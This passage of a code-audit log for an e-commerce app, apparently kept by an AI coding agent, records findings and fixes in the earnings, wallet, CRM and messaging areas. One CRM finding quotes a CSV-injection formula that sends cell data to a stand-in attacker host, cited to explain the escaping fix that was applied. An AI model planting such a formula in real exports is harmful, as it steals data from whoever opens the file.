  - **Fix applied:** Added a `KEEP IN SYNC` comment in `founder-earnings.ts:60` cross-referencing the backend constant and noting the eventual move to a `/api/config` endpoint when the frontend stops being mock.
  - File: `src/utils/founder-earnings.ts:59-63`
- 🟡 **No Stripe Connect onboarding gate on payout buttons** — `FounderEarnings.tsx` payout button doesn't check `founder_stripe_account_id`. Once the real payout pipeline lands, founders without a Stripe Connect account will hit silent failures.
  - **Deferred:** Wire to `AdminConnectManagement` state when payout flow is real.
- 🟡 **No transaction wrapping on (mock) payout writes** — `founder-earnings.ts:365-393`. When `updateEarningsStatus()` + `processStripeTransfer()` become real DB writes, they must be a single transaction.
  - **Deferred:** Address as part of the mock→real migration.
- 🟢 **Backend invoice math is correct** — `invoices.ts:223` uses integer-cents math (`Math.floor(subtotalCents * (FOUNDER_PERCENTAGE / 100))`). `invoices.ts:296-297` records `founder_percentage: 35` and `platform_percentage: 65` on the invoice row. No floating-point leakage server-side.

### Fixes Applied
- ✅ Added a `KEEP IN SYNC` comment in `src/utils/founder-earnings.ts:59-63` explaining that `founderPercentage = 0.35` shadows `backend/routes/invoices.ts:15`'s `FOUNDER_PERCENTAGE = 35` and that the source-of-truth should move to a backend config endpoint when the mock service is replaced. Tiny but stops a future "what's the number?" rabbit hole.

### Deferred (carry forward)
- Replace mock implementations in `founder-earnings.ts` with real Supabase queries against `orders`, `vendor_products` (COGS), and an `audit_logs`/`founder_earnings` table.
- Bridge or delete one of the two earnings systems (`FoundersDashboard` vs `FounderEarnings`).
- Decide route ownership: `/founders` vs `/founder/dashboard` vs `/founder/earnings`. Pick one.
- Move `CreatorAnalytics` out of `VendorDashboard` (or rename the tab to make the cross-concept explicit).
- Add empty states to all `FounderEarnings` tabs.
- Surface errors via toast / inline error state instead of `console.error` only.
- Migrate `alert()` + `prompt()` to a real form modal (carryover from #27).
- Lazy-load tab data instead of eager `Promise.all` on mount.
- Paginate earnings table.
- Add Stripe Connect onboarding gate on payout buttons.
- Wrap real payout writes in a transaction.
- When mock service goes away: source `FOUNDER_PERCENTAGE` from backend, not the frontend.

### Verdict
Same shape as Vendor area — most of the open work is "stop being mock data." One tiny doc-quality fix shipped this cycle (sync-comment on `founderPercentage`). The backend invoice path is genuinely solid (correct integer cents, role-gated, audit fields populated); it's the *parallel* `founderEarningsService` that's still entirely fake. The cleanest forward path is delete-not-rewrite: remove `founder-earnings.ts` once the invoice flow covers the same UI needs.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** No founder code touched between cycles. Backend `invoices.ts` math still correct; `founderEarningsService` still entirely mock. `FounderEarnings.tsx` still had 4 raw `alert()` calls + 1 `prompt()`, 3 `console.error`-only error handlers, no empty state on the earnings table, all data fetched on mount regardless of selected tab.

**Status of prior findings:**
- 🟡 → 🟢 **`alert()` carryover from cycle #27** — Migrated all 4 `alert()` calls in `FounderEarnings.tsx` (payout success/failure, COGS update success/failure) to structured `toast.success`/`toast.error` with title/detail. *(Fix applied this cycle.)*
- 🟡 → 🟢 **Errors hidden behind `console.error`** — Three error catches (loadData, processPayout, updateCOGS) now also surface a `toast.error(title, error.message)` so users see when a load/save fails. `console.error` retained for ops logging. *(Fix applied this cycle.)*
- 🟡 → 🟢 **No empty state on earnings table** — Added a 7-column-spanning empty row that distinguishes "No earnings yet" vs "No earnings with status X" (filter-aware copy). Mock data was masking the empty case. *(Fix applied this cycle.)*
- 🟡 **`prompt()` for COGS edit** — Kept the browser `prompt()` (replacing it with a real modal is a larger component build), but added validation: cancellation is now a clean no-op, NaN/negative input now fires `toast.warning('Invalid value', 'Enter a non-negative number.')` instead of silently doing nothing. Also added a `TODO(audit #7)` cross-reference for the eventual modal upgrade. *(Partial fix this cycle.)*
- 🔴 **Mock data in `founder-earnings.ts`** — Unchanged. Defer.
- 🔴 **No-op DB writes** in `founder-earnings.ts` — Unchanged. Defer.
- 🔴 **Two earnings systems** (`/api/invoices` real vs `founderEarningsService` mock) — Unchanged. Defer.
- 🟡 **Routes overlap** (`/founders` / `/founder/dashboard` / `/founder/earnings`) — Unchanged. Defer.
- 🟡 **CreatorAnalytics in VendorDashboard** — Unchanged. Defer (covered in cycle #6 backlog).
- ⚡ **All data loaded on mount via Promise.all** — Unchanged. Defer (real fix is splitting the load by `selectedTab`; meaningful only after the mock service is replaced with real endpoints).
- ⚡ **No pagination on earnings table** — Unchanged. Defer.
- 🟡 **No Stripe Connect onboarding gate** — Unchanged. Defer.
- 🟡 **No transaction wrapping on (mock) payout writes** — Unchanged. Defer until the writes become real.
- 🟢 **Backend invoice math** — Re-verified `invoices.ts:15, 223, 296-297` integer-cents math + percentage records. Still correct.

**New findings:**
- 🟢 **No new TODO/FIXME** in founder area since 2026-04-28 (besides the `TODO(audit #7)` I just added inline as a forward-link from this cycle's `prompt()` patch).
- 🟢 **No new console.log noise** in `founder-earnings.ts` beyond the 3 expected mock-service stubs (lines 360, 383, 493).
- 🟢 **No new endpoints** added that affect invoice/founder flow since cycle #19's promo-pricing work.

### Fixes Applied (re-audit)
- ✅ `src/pages/FounderEarnings.tsx:1-9` — Imported `useToast` and wired `const toast = useToast()` into the component.
- ✅ `src/pages/FounderEarnings.tsx:67-110` — Migrated 4 `alert()` calls to `toast.success`/`toast.error`; added `toast.error` surfacing on the previously silent `loadData` catch; preserved `console.error` for ops logging.
- ✅ `src/pages/FounderEarnings.tsx:560-580` — Tightened the `prompt()` flow: cancellation no-ops cleanly, NaN/negative input fires `toast.warning`, real numbers proceed. `TODO(audit #7)` comment added so the eventual modal-form upgrade has an explicit pointer.
- ✅ `src/pages/FounderEarnings.tsx:443-489` — Added empty-state branch on the earnings table with filter-aware copy ("No earnings yet" vs `"No earnings with status \"${filter}\""`). Type-check clean.

### Deferred (re-audit)
- Replace `founder-earnings.ts` mock service with real Supabase queries against `orders`, `vendor_products` (COGS), and a `founder_earnings` table.
- Bridge or delete one of the two earnings systems (`FoundersDashboard` vs `FounderEarnings`).
- Tab-based lazy fetching (only fetch what `selectedTab` needs) — meaningful once the service is real.
- Pagination on the earnings table.
- Stripe Connect onboarding gate on payout button.
- Replace the `prompt()` COGS editor with a proper modal form.
- Transaction wrapping around real payout writes (once mock is gone).
- Move the duplicated `FOUNDER_PERCENTAGE` constants to a backend `/api/config` endpoint.

---

## Wallet & Points System — Re-audit (2026-04-28)

**What was checked:** Status of the 7 findings from 2026-03-13 + scan for new bugs in `Wallet.tsx`, `ITCBalance.tsx`, `AdminWalletManagement.tsx`, `stripe-itc.ts`, `backend/routes/wallet.ts`, `backend/routes/admin/wallet.ts`.

### Status of 2026-03-13 findings
- 🟡 **WAS OPEN — Inconsistent HTTP status for insufficient balance** — Confirmed: `wallet.ts:644` returned 402 while `:549` and `:749` returned 400. Frontend error handlers branching on `response.status === 400` would silently miss the 402 path.
  - **Fix applied:** Changed `wallet.ts:644` from 402 → 400 to match the other two endpoints. All three `Insufficient ITC balance` responses now use 400.
  - File: `backend/routes/wallet.ts:643-649`
- 🟡 **WAS OPEN — `VITE_SITE_URL` on backend** — `wallet.ts:967` did `process.env.VITE_SITE_URL || 'https://imaginethisprinted.com'`. The `VITE_` prefix is Vite's frontend convention; on the backend it's unset unless someone explicitly mirrored it, so the hardcoded production URL was used in dev. Other backend code uses `FRONTEND_URL || APP_ORIGIN` (matches `worker/ai-jobs-worker.ts:748`).
  - **Fix applied:** Changed to `process.env.FRONTEND_URL || process.env.APP_ORIGIN || 'https://imaginethisprinted.com'` to match backend convention.
  - File: `backend/routes/wallet.ts:967`
- 🟡 **STILL OPEN — 4 separate ITC balance displays** — `Wallet.tsx:15`, `ITCBalance.tsx:9` (props), `DesignStudioModal.tsx:887`, `Sidebar.tsx:105` each track balance independently. Spending in one view doesn't update the others.
  - **Deferred:** Pull balance from a single context/zustand store and subscribe.
- 🟡 **STILL OPEN — Two cashout methods unclear** — Manual payout vs Stripe Connect Instant. UX still doesn't differentiate.
- 🟡 **STILL OPEN — ITC concept not explained** — `Wallet.tsx` still has no copy explaining ITC. `ITCBalance.tsx` shows pricing only.
- 🟡 **STILL OPEN — No transaction pagination UI** — Backend supports `limit`/`offset`, frontend doesn't expose controls.
- ⚡ **STILL OPEN — Wallet + transactions sequential** — `Wallet.tsx:83-103` still awaits in series.
  - **Deferred:** Carryover note from prior cycle: balance is needed for UI before transactions, so partial parallelization only.

### New issues found
- 🟡 **TOCTOU on ITC deduct** — `wallet.ts:633-656` does `SELECT itc_balance` then `UPDATE itc_balance = newBalance`. Two concurrent `/deduct-itc` calls can both read the same balance and both succeed, double-spending. Same risk on `/process-full-itc-payment`.
  - **Deferred:** Move balance update behind a `decrement_itc(user_id, amount)` Postgres function (RPC) that does `UPDATE ... SET itc_balance = itc_balance - X WHERE itc_balance >= X RETURNING itc_balance`. Atomic, no read-then-write.
- 🟡 **No idempotency keys on `/payout-request`** — `wallet.ts:304-443`. A double-submit (slow network + impatient user) can create two payout-request rows AND deduct twice from the wallet. The catch path attempts to refund (line 413) but timing windows still expose risk.
  - **Deferred:** Accept `idempotency_key` UUID in body; insert into a `payout_idempotency` table with a unique constraint; bail with the original response on conflict.
- 🟡 **`/connect/instant-payout` doesn't gate on onboarding completion** — `wallet.ts:1003+` calls `getConnectAccountStatus()` but doesn't refuse the payout when `onboarding_complete: false`. Stripe will reject; we'd rather refuse upfront with a clearer error.
  - **Deferred:** Add explicit check.
- 🟡 **Audit log writes outside the same transaction as balance change** — `wallet.ts:653-656` updates balance, `:664-671` inserts the `itc_transactions` audit row. If the audit insert fails or the process crashes between them, the balance change exists with no audit row.
  - **Deferred:** Combine into one RPC or use a database-level trigger on `user_wallets` writes.
- 🟡 **No DB-level non-negative balance constraint** — `user_wallets.itc_balance` can go negative if the application logic is bypassed. Should be `CHECK (itc_balance >= 0)`.
  - **Deferred:** Schema migration.
- 🟢 **Other `VITE_SUPABASE_*` references are defensive fallbacks** — `coupons.ts:9-10`, `gift-cards.ts:9-10`, `ai/chat.ts:13-14` use `SUPABASE_URL || VITE_SUPABASE_URL` (canonical first). Acceptable for shared `.env` convenience; not the same bug as `wallet.ts:967`.

### Fixes Applied
- ✅ `backend/routes/wallet.ts:643-649` insufficient-balance status standardized 402 → 400 across all three endpoints. `API:200` post-edit.
- ✅ `backend/routes/wallet.ts:967` `VITE_SITE_URL` → `FRONTEND_URL || APP_ORIGIN` to match backend env convention.

### Deferred (carry forward)
- Atomic ITC deduction via Postgres RPC (`decrement_itc`); kills the TOCTOU race.
- Idempotency keys on `/payout-request`.
- Onboarding-completion guard on `/connect/instant-payout`.
- Combine balance update + audit-log insert into one transaction or RPC.
- DB CHECK constraint `itc_balance >= 0`.
- Centralize ITC balance in a shared store so the four UI surfaces sync.
- Differentiate the two cashout methods in UX.
- Add ITC explainer copy to `Wallet.tsx`.
- Pagination UI on transaction history.

### Verdict
Two real bugs shipped (HTTP status drift, env-var prefix leak) — both small but real correctness issues that the previous cycle deferred. The remaining open items are split between UX polish (sync balance across views, explain ITC) and money-safety hardening (TOCTOU, idempotency, audit-log atomicity, non-negative constraint). The financial logic is still trustworthy in single-request flows but has well-known concurrent-access gaps that warrant a focused hardening pass before scaling.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** ITC explainer section is actually already in `Wallet.tsx:584-614` (re-audit found the prior cycle's "still open" was stale; reclassifying 🟢). `decrement_itc` RPC migration confirmed wired with legacy fallback at `backend/routes/wallet.ts:657-729` — TOCTOU concern from cycle #8 closed when RPC is live. `processInstantPayout` only checked `payouts_enabled`, missing the more precise `onboarding_complete` gate. Frontend `loadTransactionHistory` was hitting backend default limit=50 without paging UI; users with longer history hit a wall.

**Status of prior findings:**
- 🟡 → 🟢 **ITC explainer copy** — Already exists at `Wallet.tsx:584-614` (definition + use cases + how to get more). Reclassifying 🟢. Audit doc was stale.
- 🟢 **TOCTOU on ITC deduct** — Confirmed `decrement_itc` RPC integration lives at `backend/routes/wallet.ts:657-729` with a `PGRST202`-detecting fallback to the legacy SELECT-then-UPDATE. Once the RPC is applied in prod, the race is gone.
- ⚡ → 🟢 **No transaction pagination UI** — Added a 20-rows-per-page Load More flow on the History tab. Backend `/api/wallet/transactions/itc` already accepted `limit`/`offset`; frontend just wasn't using them. *(Fix applied this cycle.)*
- 🟡 → 🟢 **`/connect/instant-payout` onboarding gate** — Replaced the single `payouts_enabled` check in `processInstantPayout` with a two-stage gate: `onboarding_complete=false` returns "Please complete Stripe Connect onboarding before cashing out", `payouts_enabled=false` returns "Your Stripe account is still being verified. Cash-out will be available once Stripe completes review." Specific copy → user knows the next step. *(Fix applied this cycle.)*
- 🟡 **4 separate ITC balance displays** (Wallet/ITCBalance/DesignStudioModal/Sidebar) — Unchanged. Defer (real fix is shared context/store).
- 🟡 **Two cashout methods unclear UX** — Unchanged. Defer (UX-design work).
- 🟡 **Idempotency keys on `/payout-request`** — Unchanged. Defer (needs schema migration).
- 🟡 **Audit-log writes outside balance-update transaction** — Unchanged. Defer (RPC or DB trigger).
- 🟡 **No DB CHECK on `itc_balance >= 0`** — Unchanged. Defer (schema migration).
- ⚡ **Wallet + transactions sequential** — Unchanged. Acceptable: balance is needed for UI before transactions render.

**New findings:**
- 🟢 **Per-IP `/referral/validate` rate limiter** — Confirmed still in place at `backend/routes/wallet.ts:21-39, 195-223` (cycle #23 fix).
- 🟢 **No new wallet endpoints / no new console.log noise** since 2026-04-28.

### Fixes Applied (re-audit)
- ✅ `backend/services/stripe-connect.ts:308-321` — Two-stage onboarding gate with specific error copy for each failure mode (`onboarding_complete=false` vs `payouts_enabled=false`).
- ✅ `src/pages/Wallet.tsx:16-23, 113-150, 935-960` — 20-rows-per-page Load More pagination on History tab. New state: `txHasMore`, `txLoadingMore`, `TX_PAGE_SIZE`. New helper `mapTransactions` shared between initial load and `loadMoreTransactions`. Heuristic for "more available": last response returned a full page. Renders `Load more transactions` button while `txHasMore`, `No more transactions` footer when exhausted.

### Deferred (re-audit)
- Centralize ITC balance in a shared context/store (kills the 4-display drift).
- Differentiate manual-payout vs Stripe Connect Instant in cashout UX.
- Idempotency keys on `/payout-request` (DB schema work).
- Combine balance update + audit-log insert into single RPC/transaction.
- DB-level `CHECK (itc_balance >= 0)` constraint on `user_wallets`.
- Confirm `decrement_itc` migration applied in prod and remove the legacy fallback once safe.

---

## CRM & Customer Management — Re-audit (2026-04-28)

**What was checked:** Status of the 10 findings from 2026-03-13 + scan for new bugs in `CRM.tsx`, `CustomerMessages.tsx`, `VendorMessages.tsx`, `messaging.ts`, `types/index.ts`, plus a check for new admin/CRM-flavored backend routes.

### Status of 2026-03-13 findings
- 🔴 **STILL OPEN — `messaging.ts` is stubbed** — `src/utils/messaging.ts:80,83,86,297-308`. `saveMessage`, `updateConversationLastMessage`, `getMessages` all `console.log`-only / hardcoded mock.
- 🔴 **STILL OPEN — No messaging backend routes** — Grep `backend/routes/` finds no `messages.ts`/`conversations.ts`. `support.ts` handles tickets but not generic CRM chat.
- 🔴 **STILL OPEN — CRM internal chat doesn't persist** — `CRM.tsx:19-20` chat in local state.
- 🟡 **WAS OPEN — `Order` type missing `updatedAt`** — `src/types/index.ts:67-86` had no `updatedAt` field while `CRM.tsx:186` was setting it. Type silently allowed it via the spread, but consumers using strict typing (e.g. order-management surfaces) couldn't read it back.
  - **Fix applied:** Added `updatedAt?: string` to the `Order` interface.
  - File: `src/types/index.ts:74`
- 🟡 **PARTIAL — `CustomerMessages` vs `VendorMessages` overlap** — `CustomerMessages.tsx` 394 LOC, `VendorMessages.tsx` 545 LOC. ~28% structural overlap (the original "95%" estimate was too high). Acceptable given the role-specific divergence.
- 🟡 **STILL OPEN — Dead "View Details" button** — `CRM.tsx:779-781` no `onClick`.
- 🟡 **STILL OPEN — Dead "+ Add Tag" button** — `CRM.tsx:891-893` no `onClick`.
- 🟡 **STILL OPEN — Order status dropdown missing values** — `CRM.tsx:562-568` shows 6 options; the type union has 8. `processing` and `approved` (or `rejected`) are missing from the dropdown.
- 🟡 **STILL OPEN — Chat discards messages silently** — No "not saved" hint to the user in CRM chat UI.
- ⚡ **STILL OPEN — Filtered data not memoized** — `CRM.tsx:252-277` recomputes `filteredCustomers` / `filteredOrders` / `allTags` per render.

### New issues found
- 🔴 **WAS OPEN — CSV injection risk in `exportToCSV`** — `CRM.tsx:193-218`. The exporter quoted strings only when they contained a comma, and never escaped formula-prefix characters (`=`, `+`, `-`, `@`, tab, CR). A customer name like `=HYPERLINK("http://attacker.example/?token="&A1)` would execute as a formula in Excel/Sheets when an admin opened the export. Internal `"` characters were also unescaped, so any quoted string with embedded quotes would corrupt the row.
  - **Fix applied:** Centralized CSV escaping in a local `escapeCsv()` helper that (a) prefixes any value starting with `= + - @ \t \r` with a single quote so spreadsheets treat it as text, and (b) wraps values containing `, " \n \r` in double quotes and doubles internal quotes (RFC 4180). Headers and row values both run through the helper.
  - File: `src/pages/CRM.tsx:193-220`
- 🟡 **WAS OPEN — `URL.createObjectURL` leak in CSV export** — `CRM.tsx` created the object URL but never revoked it; one-megabyte CSVs would linger until tab close.
  - **Fix applied:** Wrapped the link build/click in `try { … } finally { URL.revokeObjectURL(url) }`.
  - File: `src/pages/CRM.tsx:222-235`
- 🟡 **STILL OPEN — Inline lambdas in order-row table** — `CRM.tsx:669,677,685,692` `onClick={() => updateOrderStatus(...)}` recreates handlers on every render. Defer until the table is memoized as a child component.
- 🟡 **STILL OPEN — Hardcoded role strings** — `CRM.tsx:279` hardcodes `'admin'`/`'manager'`. Low risk; matches backend.
- 🟡 **STILL OPEN — Direct Supabase mutations from frontend in CRM** — `CRM.tsx:33-34,180`. Same pattern flagged in admin re-audit.

### Fixes Applied
- ✅ **CSV injection + quote escaping fix** — `escapeCsv()` helper in `CRM.tsx:204-211` defeats spreadsheet formula execution and produces RFC-4180-compliant rows.
- ✅ **CSV blob URL leak** — `try/finally` revoke in `CRM.tsx:222-235`.
- ✅ **`Order.updatedAt` typed** — `src/types/index.ts:74` adds `updatedAt?: string`.

### Deferred (carry forward)
- Replace `messaging.ts` stubs with real Supabase queries; add `backend/routes/messages.ts` and `conversations.ts` (or fold into `support.ts` if CRM chat is conceptually a ticket).
- Persist CRM internal chat or surface "Chat is not saved (refresh = lost)" copy.
- Wire dead "View Details" and "+ Add Tag" buttons (or remove).
- Add `processing` + `approved`/`rejected` to the order-status dropdown.
- `useMemo` around `filteredCustomers`, `filteredOrders`, `allTags`.
- Memoize order-row handlers (`useCallback` per row id).
- Move CRM frontend mutations behind backend admin endpoints with audit rows (matches #5 deferred).

### Verdict
The CSV injection issue was a real, exploit-class bug — admin downloads run with admin privileges, and a hostile customer name could pivot into spreadsheet formula execution on the admin's machine. That fix alone makes this a high-value cycle. `Order.updatedAt` typing closed an "ambient any" hole. Messaging is still entirely mock — same shape as Vendor (#6) and Founder Earnings (#7). The dead/duplicate UI buttons and useMemo wins are appropriate to defer to a focused CRM polish pass.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** No CRM code touched between cycles. CSV escaping fix and `Order.updatedAt` type fix from prior cycle still in place. `messaging.ts` still mock. `+ Add Tag` button (line 906) and `View Details` button (line 794) still inert. Order-status filter dropdown still missing 3 type-union values (`processing`, `approved`, `rejected`) and listed a non-union value (`cancelled`). `filteredCustomers` / `filteredOrders` / `allTags` still recomputed every render.

**Status of prior findings:**
- 🟡 → 🟢 **Order status dropdown missing values** — Added `processing`, `approved`, `rejected`. Kept `cancelled` (legacy: `OrderManagement.tsx` still emits/filters on it even though it's missing from the `Order` type union; safer to surface it for admins than to hide cancelled orders). Comment in source explains the divergence. *(Fix applied this cycle.)*
- 🟡 → 🟢 **Dead "+ Add Tag" button** — Wired to a new `addTag(customerId)` helper that mirrors the existing `removeTag` pattern. Uses `prompt()` for now (matches the same UX deferral as `FounderEarnings` COGS edit), trims and de-dupes input. `TODO(audit #9)` comment cross-references the eventual modal upgrade. *(Fix applied this cycle.)*
- 🟡 → 🟢 **Dead "View Details" button** — Removed (no `onClick`, no detail modal target). Comment left where it lived so a future jobs-detail modal has the obvious mounting point. *(Fix applied this cycle.)*
- ⚡ → 🟢 **Filtered data not memoized** — `filteredCustomers`, `filteredOrders`, and `allTags` all wrapped in `useMemo` with their proper dep lists (`searchTerm`/`filterTag` for customers; `searchTerm`/`orderStatusFilter`/`dateRange.start`/`dateRange.end` plus the source arrays for orders; just `customers` for tags). Returns now have stable references between unrelated renders, which lets downstream rows benefit from the existing memoization in their tables. Also pre-lowercased `searchTerm` once instead of per-row. *(Fix applied this cycle.)*
- 🔴 **`messaging.ts` stubs** — Unchanged. Defer.
- 🔴 **No backend messaging routes** — Unchanged. Defer.
- 🔴 **CRM internal chat doesn't persist** — Unchanged. Defer.
- 🟡 **Chat discards messages silently** — Unchanged. Defer (small UX copy add).
- 🟡 **`CustomerMessages` vs `VendorMessages` overlap** — Unchanged 28% overlap, accepted.
- 🟡 **Direct Supabase mutations from CRM** — Unchanged. Defer (matches admin-area carryover).
- 🟡 **Inline lambdas in order-row table** — Unchanged. Defer until table is extracted to memoized child.
- 🟡 **Hardcoded role strings** — Unchanged. Low risk.

**New findings:**
- 🟡 **`cancelled` order status drift between `Order` type union and `OrderManagement.tsx`** — Discovered while pruning the CRM dropdown. `Order.status` in `src/types/index.ts:72` lists `'pending' | 'processing' | 'printed' | 'shipped' | 'delivered' | 'on_hold' | 'approved' | 'rejected'` (no `'cancelled'`), but `src/pages/OrderManagement.tsx` includes `'cancelled'` in its filter list and color-coding. Either the type union or the OrderManagement code is wrong. Defer for the next OrderManagement re-audit (#19).

### Fixes Applied (re-audit)
- ✅ `src/pages/CRM.tsx:1` — Imported `useMemo`.
- ✅ `src/pages/CRM.tsx:164-188` — Added `addTag(customerId)` helper with prompt-based UX, trim + de-dupe, and `TODO(audit #9)` pointer for the eventual modal.
- ✅ `src/pages/CRM.tsx:267-309` — Wrapped `filteredCustomers`, `filteredOrders`, and `allTags` in `useMemo`. Pre-computed lowercased `searchTerm` once per evaluation.
- ✅ `src/pages/CRM.tsx:577-604` — Order-status filter dropdown now lists all 8 type-union values plus a clearly-commented `cancelled` legacy option.
- ✅ `src/pages/CRM.tsx:794-806` — Removed inert `View Details` button; left a comment marking the obvious mount point for a future jobs-detail modal.
- ✅ `src/pages/CRM.tsx:919-925` — Wired `+ Add Tag` button to the new `addTag` helper.

### Deferred (re-audit)
- Replace `messaging.ts` stubs with real Supabase queries; add `backend/routes/messages.ts`/`conversations.ts` (or fold into `support.ts`).
- Persist CRM internal chat OR surface "Chat is not saved (refresh = lost)" copy.
- Move CRM frontend mutations to backend admin endpoints with audit rows (matches #5 deferred).
- Memoize order-row handlers (`useCallback` per row id) once the row is its own memoized child.
- Replace prompt-based tag editor with a tag picker modal.
- Reconcile `Order.status` type union with `OrderManagement.tsx` (add `cancelled` to the union OR remove it from `OrderManagement` filter — needs product-team decision).

---

## Messaging & Communications — Re-audit (2026-04-28)

**What was checked:** Status of the 7 findings from 2026-03-13 + scan for new bugs in `MrImagineChatWidget.tsx`, `VoiceConversation.tsx` (now deleted), `VoiceConversationEnhanced.tsx`, `VoiceProductForm.tsx`, `backend/routes/ai/chat.ts`, `backend/routes/ai/voice-chat.ts`, `backend/routes/ai/voice.ts`, `backend/routes/ai/transcribe.ts`, `backend/routes/ai/mr-imagine-chat.ts`.

### Status of 2026-03-13 findings
- 🟡 **STILL OPEN — Live-chat fetch hits admin endpoint without `Authorization`** — `MrImagineChatWidget.tsx:241` (current line range) POSTs to `/api/admin/support/tickets/{id}/messages` with no token. The `/admin/` route is `requireAdmin`-gated, so customer messages would 403 silently. The widget AND the backend route protection are both wrong for the use case (customer live chat shouldn't be on `/api/admin/...` at all).
  - **Deferred:** Either add a customer-side `/api/support/tickets/:id/messages` route OR change the widget endpoint. Bigger than a 1-min fix; matches the broader "customer messaging needs a proper backend" theme from #9.
- ✅ **FIXED — `ChatBotWidget` deleted** — Confirmed via glob. Cycle #30 (2026-04-27) removed `src/components/ChatBotWidget.tsx`.
- 🔴 **WAS OPEN — `VoiceProductForm` requested non-existent `'gpt-5.1'` model** — `VoiceProductForm.tsx:43`. Backend `chat.ts:129,337` does `model || 'gpt-4o'` and forwards the client-supplied value to OpenAI; OpenAI then returned an invalid-model error which the frontend `catch` swallowed as "AI Brain offline". Voice product chat has been silently broken in this code path since 2026-03-13.
  - **Fix applied:** Changed `model: 'gpt-5.1'` → `model: 'gpt-4o'`.
  - File: `src/components/VoiceProductForm.tsx:43`
- 🟡 **WAS OPEN — `VoiceConversation.tsx` was 174 lines of dead code** — Verified zero imports across `src/`. Replaced everywhere by `VoiceConversationEnhanced` (used in `UserProductCreator.tsx:4,765`).
  - **Fix applied:** Deleted `src/components/VoiceConversation.tsx`.
- 🔴 **STILL OPEN — 2-second polling, no backoff** — `MrImagineChatWidget.tsx:208`. Same finding flagged in cycle #30 with the additional stale-closure bug on `lastPollTime`. Deferred there for live-ticket testing.
- ⚡ **STILL OPEN — Full chat history resent every turn** — `MrImagineChatWidget.tsx:266-281`. Body still includes the entire `history` array. ~1KB/turn overhead.
  - **Deferred:** Server-side session tracking; orthogonal to current cycle.
- 🟡 **PARTIAL — Design generation after transcription** — `VoiceConversationEnhanced.tsx:274` fires `generateDesigns(...)` immediately on response receipt; sequencing is acceptable.

### New issues found
- 🔴 **`/api/ai/chat` is unauthenticated AND trusts client-supplied `model`** — `backend/routes/ai/chat.ts:29` mounts `router.post('/', ...)` with no `requireAuth`. Anyone can invoke the OpenAI-backed endpoint, including the `create_support_ticket` tool path. The body-supplied `model` is forwarded to OpenAI (`:129,337`), so a hostile client could request expensive models. Mr. Imagine is intentionally pre-auth (used by browsing visitors), so the right fix is `optionalAuth` + server-side allowlist of `model` values.
  - **Deferred:** Mount `optionalAuth` (the middleware already exists at `backend/middleware/supabaseAuth.ts:64-101`); ignore client-supplied `model` and use a server constant or an allowlist; rate-limit by IP for unauthenticated callers. Not safe to ship in this cycle without testing the unauthenticated visitor path.
- 🟡 **TTS endpoint has no rate limit** — `backend/routes/ai/voice.ts` `/synthesize` requires auth but is not rate-limited. Each call costs real money on Replicate/MiniMax. A logged-in attacker (or a buggy client retry loop) could rack up bills.
  - **Deferred:** Add the same in-memory rate-limit pattern used in `account.ts:378-410` (welcome-email). 5 calls/IP/min would do.
- 🟡 **Console.log noise in `voice-chat.ts`** — 23+ emoji-prefixed logs across the request flow. Useful when building, noisy in prod.
  - **Deferred:** Wrap in a `DEBUG_VOICE` flag check, matching the carryover from #28 for `AdminCreateProductWizard.tsx`.
- 🟢 **`MrImagineModal` blob URL leak was already fixed in cycle #4 (2026-04-28)** — Explore agent flagged this as new but the `try/finally URL.revokeObjectURL` was added when re-auditing #4 earlier today.
- 🟢 **`requireAuth` on other AI endpoints** — `voice-chat.ts:37`, `voice.ts:10`, `transcribe.ts`, `mr-imagine-chat.ts` are all auth-gated. Only `/api/ai/chat` is the outlier.

### Fixes Applied
- ✅ `src/components/VoiceProductForm.tsx:43` — model `'gpt-5.1'` → `'gpt-4o'`. Restores a silently-broken AI flow.
- ✅ Deleted `src/components/VoiceConversation.tsx` (174 lines, 0 imports). Replaced everywhere by `VoiceConversationEnhanced`.
- API:200 Web:200 post-edit.

### Deferred (carry forward)
- Customer live-chat route: stop hitting `/api/admin/...`; add a customer-facing `/api/support/tickets/:id/messages` (or change endpoint) AND wire the widget to send `Authorization: Bearer ${access_token}`.
- `/api/ai/chat`: mount `optionalAuth`, server-side model allowlist, IP rate-limit for anonymous callers.
- Rate-limit `/api/ai/voice/synthesize` (and any other paid AI route) with the same in-memory pattern used in `account.ts`.
- Replace 2s polling in `MrImagineChatWidget` with SSE/websocket OR exponential backoff.
- Move chat history to server-side session storage (last-N or session ID-based context).
- Fix `lastPollTime` stale-closure bug (carryover from cycle #30).
- Wrap voice-chat backend logs behind a `DEBUG_VOICE` env flag.

### Verdict
A silently-broken voice-product chat path (`gpt-5.1` invalid-model) and 174 lines of dead code shipped out this cycle. The biggest unaddressed item is `/api/ai/chat` running unauthenticated AND trusting a client-supplied model name — a real cost-vector bug — which needs careful handling because the route intentionally serves anonymous visitors. Two AI hardening tasks (rate-limit `/synthesize`, `optionalAuth` on `/chat`) should pair into one focused security pass.

### Re-audit 2026-04-29

**What changed since 2026-04-28:** The cycle #16 work I have memorized landed and is intact: `backend/routes/ai/chat.ts` now uses `optionalAuth` (line 7), `ALLOWED_MODELS` Set (line 16), and a per-IP rate-limit (lines 21-36). That closes the prior cycle's biggest 🔴. `/api/ai/voice/synthesize` was still unrate-limited even though it's a paid endpoint. `voice-chat.ts` still emitted 17 emoji-prefixed `console.log` calls per request. The `MrImagineChatWidget` admin-endpoint auth gap and stale-closure polling bugs are still real and risky to touch without live-chat verification.

**Status of prior findings:**
- 🔴 → 🟢 **`/api/ai/chat` unauthenticated + client-trusted `model`** — Already resolved in cycle #16. Verified: `optionalAuth` middleware mounted, `ALLOWED_MODELS` Set enforces server-side allowlist (rejects body-supplied unknown models), per-IP rate limit live.
- 🟡 → 🟢 **TTS `/synthesize` no rate limit** — Added per-user 30-req/min in-memory rate limiter to `backend/routes/ai/voice.ts`. Returns 429 above the cap. *(Fix applied this cycle.)*
- 🟡 → 🟢 **`voice-chat.ts` console.log noise** — Added `debugLog` helper gated on `process.env.DEBUG_VOICE`; migrated all 17 `console.log('[voice-chat]` calls. Production silent by default; ops can flip `DEBUG_VOICE=1` to re-enable the trace timeline without redeploying. *(Fix applied this cycle.)*
- 🔴 **`MrImagineChatWidget` admin-endpoint auth gap** (line 241) — POSTs to `/api/admin/support/tickets/{id}/messages` without `Authorization`. Real fix is splitting the route: a customer-facing `/api/support/tickets/:id/messages` plus widget rewiring. Defer (live-chat regression risk; flagged for the next focused support pass).
